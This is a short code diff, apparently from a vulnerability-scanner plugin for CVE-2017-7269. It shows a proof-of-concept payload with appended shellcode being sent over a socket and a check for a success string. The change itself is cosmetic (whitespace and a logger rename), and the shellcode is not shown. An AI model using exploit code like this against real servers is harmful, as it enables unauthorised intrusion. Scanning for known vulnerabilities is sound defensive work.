@@ -34,10 +34,10 @@ class poc(Plugin):
             pay+=shellcode
             pay+='>\r\n\r\n'
     
-            sock.send(pay)  
+            sock.send(pay)
             data = sock.recv(80960)
             if 'HHIT CVE-2017-7269 Success' in data:
                 self.log.vuln(target)
             sock.close
         except Exception as e:
-            self.logger.error(target+' : '+str(e))
+            self.log.error(target+' : '+str(e))
